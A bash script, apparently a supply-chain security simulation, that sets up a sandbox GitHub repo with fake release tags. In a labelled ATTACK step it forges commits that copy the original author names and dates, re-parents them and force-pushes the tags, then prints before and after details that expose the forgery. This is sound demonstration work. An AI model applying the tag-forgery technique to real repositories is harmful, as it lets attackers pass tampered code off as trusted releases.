#!/usr/bin/env bash
set -eu
ORG="${ORG:-supplychain-labs}"
REPO=sim-trivy

git config --global user.name  "sim-operator"
git config --global user.email "sim-operator@example.com"
git config --global init.defaultBranch master
git config --global credential.helper '!gh auth git-credential'

echo "=== [0] clean any prior run ==="
gh repo delete "$ORG/$REPO" --yes 2>/dev/null || true
sleep 2

echo "=== [1] create seed repo ==="
gh repo create "$ORG/$REPO" --public --add-readme
sleep 3
cd /tmp
rm -rf "$REPO"
git clone "https://github.com/$ORG/$REPO"
cd "$REPO"
DEFBR="$(git rev-parse --abbrev-ref HEAD)"
echo "default branch = $DEFBR"

echo "=== [2] fabricate historical releases + tags ==="
i=0
for ver in 0.18.0 0.19.0 0.20.0; do
  i=$((i+1)); yr=$((2020 + i))
  echo "version $i" > VERSION.txt
  git add VERSION.txt
  GIT_AUTHOR_DATE="${yr}-06-01T10:00:00"  GIT_COMMITTER_DATE="${yr}-06-01T10:00:00" \
    git commit \
      --author="victim-bot <bot@victim.com>" \
      -m "release v${ver} (#$((100+i)))

Fixes #$((90+i))"
  git tag "v${ver}"
done
echo "version latest" > VERSION.txt; git add VERSION.txt
git commit -m "chore: master HEAD $(date -u +%F)"
git push origin "HEAD:$DEFBR"
git push origin --tags

echo "=== [3] BEFORE state (genuine tags) ==="
for t in v0.18.0 v0.19.0 v0.20.0; do
  c=$(git rev-parse "$t")
  git show -s --format="  $t -> %h  author=%an <%ae>  authored=%aI  parent=%p" "$c"
done

echo "=== [4] ATTACK: clone metadata, re-parent onto current HEAD, force-push tags ==="
NEWPARENT=$(git rev-parse "origin/$DEFBR")
SHARED_TREE=$(git rev-parse "origin/$DEFBR^{tree}")
echo "re-parent target (today's HEAD) = $NEWPARENT"
echo "shared tree (master HEAD)        = $SHARED_TREE"
for t in v0.18.0 v0.19.0 v0.20.0; do
  OLD=$(git rev-parse "$t")
  AN=$(git show -s --format=%an "$OLD"); AE=$(git show -s --format=%ae "$OLD")
  AD=$(git show -s --format=%aI "$OLD"); CD=$(git show -s --format=%cI "$OLD")
  MSG=$(git show -s --format=%B "$OLD")
  NEW=$(GIT_AUTHOR_NAME="$AN" GIT_AUTHOR_EMAIL="$AE" GIT_AUTHOR_DATE="$AD" \
        GIT_COMMITTER_NAME="$AN" GIT_COMMITTER_EMAIL="$AE" GIT_COMMITTER_DATE="$CD" \
        git commit-tree "$SHARED_TREE" -p "$NEWPARENT" -m "$MSG")
  git tag -f "$t" "$NEW"
done
git push --force origin --tags

echo "=== [5] AFTER state (forged tags: old author date, recent parent, unsigned, same parent) ==="
for t in v0.18.0 v0.19.0 v0.20.0; do
  c=$(git rev-parse "$t")
  git show -s --format="  $t -> %h  author=%an <%ae>  authored=%aI  committed=%cI  parent=%p  sig=%G?" "$c"
done

echo "=== DONE: https://github.com/$ORG/$REPO/tags ==="
